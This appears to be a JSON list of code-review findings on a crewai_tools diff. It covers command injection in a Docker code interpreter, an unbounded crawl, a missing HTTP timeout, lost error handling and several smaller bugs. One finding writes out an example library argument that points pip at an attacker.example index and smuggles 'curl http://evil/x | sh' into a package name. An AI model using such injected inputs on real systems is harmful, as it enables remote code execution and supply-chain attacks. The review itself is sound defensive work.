@@ -1,0 +1,83 @@
+{
+  "findings": [
+    {
+      "failure_scenario": "run_code_in_docker('print(\"Hello, World!\")', []) builds `python3 -c \"print(\"Hello, World!\")\"`; docker-py shlex-splits the string (or the daemon/shell re-parses it), producing a parse error such as `ValueError: No closing quotation` instead of output. Code containing shell metacharacters is likewise no longer passed verbatim. The deleted test `test_run_code_in_docker_with_script` used exactly `print(\"This is line 1\")` and would have caught this.",
+      "file": "crewai_tools/tools/code_interpreter_tool/code_interpreter_tool.py",
+      "line": 111,
+      "summary": "The code string is interpolated into a single command string (`python3 -c \"{code}\"`) instead of being passed as an argv list, so any double quote in the code breaks command parsing."
+    },
+    {
+      "failure_scenario": "libraries_used=[\"numpy --index-url https://attacker.example/simple\"] (an agent/tool-argument-controlled string) is split by docker into `pip install numpy --index-url https://attacker.example/simple`, making pip use an attacker-controlled index; if the command string is shell-interpreted, `numpy; curl http://evil/x | sh` executes a shell command in the container.",
+      "file": "crewai_tools/tools/code_interpreter_tool/code_interpreter_tool.py",
+      "line": 82,
+      "summary": "`exec_run(f\"pip install {library}\")` interpolates LLM-supplied library names into a command string, so extra words become pip options/arguments rather than part of one package name (previously passed as the argv list [\"pip\", \"install\", library])."
+    },
+    {
+      "failure_scenario": "SpiderTool()._run(url=\"https://example.com\", mode=\"crawl\") now sends only {\"return_format\": \"markdown\"}; per the README changed in this same diff, an unset/0 limit means crawl all pages, so the tool crawls the entire site (runaway latency and Spider API credit consumption) where it previously capped at 5 pages.",
+      "file": "crewai_tools/tools/spider_tool/spider_tool.py",
+      "line": 55,
+      "summary": "Crawl mode no longer applies the removed `DEFAULT_CRAWL_LIMIT = 5`, so an unbounded crawl is requested when the caller passes no params."
+    },
+    {
+      "failure_scenario": "If the Serper endpoint accepts the connection but never responds (or a network middlebox blackholes it), `requests.request(...)` with no timeout hangs indefinitely, blocking the agent's tool call with no failure surfaced.",
+      "file": "crewai_tools/tools/serper_dev_tool/serper_dev_tool.py",
+      "line": 65,
+      "summary": "The rewritten request drops the timeout that the baseline passed (`timeout=10`), so the HTTP call can block forever."
+    },
+    {
+      "failure_scenario": "With an invalid or expired SERPER_API_KEY, Serper answers HTTP 401 with `{\"message\": \"Unauthorized\"}`; `\"organic\" not in results` is true, so the tool silently returns that raw dict as the search result (also breaking the string return type), hiding the auth failure. A 502 HTML page instead raises `requests.exceptions.JSONDecodeError` at `response.json()`.",
+      "file": "crewai_tools/tools/serper_dev_tool/serper_dev_tool.py",
+      "line": 68,
+      "summary": "Removed `raise_for_status()`/JSON error handling from the baseline: HTTP error bodies are parsed and returned as if they were search results, and non-JSON responses raise unhandled."
+    },
+    {
+      "failure_scenario": "Unmocked, `run_code_in_docker(code, \"numpy,pandas\")` loops over the string and runs `pip install n`, `pip install u`, ... (13 separate pip execs for a 13-character string); because the docker client is a MagicMock the test still passes, so it hides install-path breakage and enshrines an argument shape `CodeInterpreterSchema.libraries_used: List[str]` rejects.",
+      "file": "tests/tools/test_code_interpreter_tool.py",
+      "line": 14,
+      "summary": "The test now passes a comma-joined string where the schema and `run_code_in_docker`/`_install_libraries` require `List[str]`, and `_install_libraries` iterates that string character by character."
+    },
+    {
+      "failure_scenario": "LlamaIndexTool.from_tool(t, result_as_answer=True) (the flag exists on crewai's BaseTool and was what the deleted branch read) now returns the raw LlamaIndex ToolOutput/ToolCall object; since crewai promotes result_as_answer tool output directly to the final answer, the agent's final answer becomes the tool-call repr instead of the text content.",
+      "file": "crewai_tools/tools/llamaindex_tool/llamaindex_tool.py",
+      "line": 21,
+      "summary": "Removed the `if self.result_as_answer: return tool(*args, **kwargs).content` branch, so the LlamaIndex tool no longer unwraps its ToolOutput when crewai's result_as_answer flag is enabled."
+    },
+    {
+      "failure_scenario": "tool._run(search_query=\"x\", n_results=25) asks Serper for 25 results but slices `results[\"organic\"][: self.n_results]` (default 10), returning 10; conversely with constructor n_results=5 and call n_results=10, 10 are fetched and 5 returned. The kwarg is therefore inconsistent between request and response.",
+      "file": "crewai_tools/tools/serper_dev_tool/serper_dev_tool.py",
+      "line": 71,
+      "summary": "The request payload uses the per-call local `n_results` but the result slice still uses `self.n_results`, so a caller-supplied `n_results` cannot control the returned count."
+    },
+    {
+      "failure_scenario": "SpiderTool()._run(url=\"https://x\", params={\"return_format\": \"html2text\"}) silently returns markdown even though the README modified in this diff documents `markdown`, `raw`, `text`, and `html2text` as supported; the dict owned by the caller is also mutated after the call, so a reused params dict keeps the injected key.",
+      "file": "crewai_tools/tools/spider_tool/spider_tool.py",
+      "line": 53,
+      "summary": "`params[\"return_format\"] = \"markdown\"` forcibly overrides a caller-provided return format and mutates the caller's dict."
+    },
+    {
+      "failure_scenario": "SeleniumScrapingTool()._run(website_url=\"HTTPS://example.com\") or the constructor with \"HTTP://example.com\" raises ValueError(\"URL must start with http:// or https://\") even though the URL is valid and Chrome accepts it; the same case-sensitive regex is duplicated in `_create_driver` (line 135).",
+      "file": "crewai_tools/tools/selenium_scraping_tool/selenium_scraping_tool.py",
+      "line": 34,
+      "summary": "The URL scheme check `re.match(r'^https?://', v)` is case-sensitive although URL schemes are case-insensitive."
+    },
+    {
+      "failure_scenario": "The README added in this diff lists `return_html` under Arguments, but when an agent invokes the tool the argument is not part of the schema (and when website_url is set at construction the schema is the empty FixedSeleniumScrapingToolSchema), so the model cannot discover or pass it; the new tests only call `_run` directly, so this interface gap is never exercised.",
+      "file": "crewai_tools/tools/selenium_scraping_tool/selenium_scraping_tool.py",
+      "line": 90,
+      "summary": "`return_html` is consumed from `_run` kwargs but is absent from `SeleniumScrapingToolSchema`/`FixedSeleniumScrapingToolSchema`, the args_schema that exposes tool arguments to agents."
+    },
+    {
+      "failure_scenario": "SpiderTool()._run(url=\"https://x\", mode=None), which type-checks against the declared signature, raises ValueError(\"Unknown mode in `mode` parameter...\") instead of treating None as the documented default \"scrape\".",
+      "file": "crewai_tools/tools/spider_tool/spider_tool.py",
+      "line": 46,
+      "summary": "`mode` is annotated `Optional[Literal[\"scrape\", \"crawl\"]]` (None permitted by the signature) but the validation rejects None."
+    },
+    {
+      "failure_scenario": "Copying the example verbatim raises `NameError: name 'Agent' is not defined` at `searcher = Agent(...)`; the snippet needs `from crewai import Agent, Task, Crew`.",
+      "file": "crewai_tools/tools/spider_tool/README.md",
+      "line": 25,
+      "summary": "The new README example uses Agent, Task, and Crew but only imports SpiderTool, so the example cannot run as written."
+    }
+  ],
+  "level": null
+}
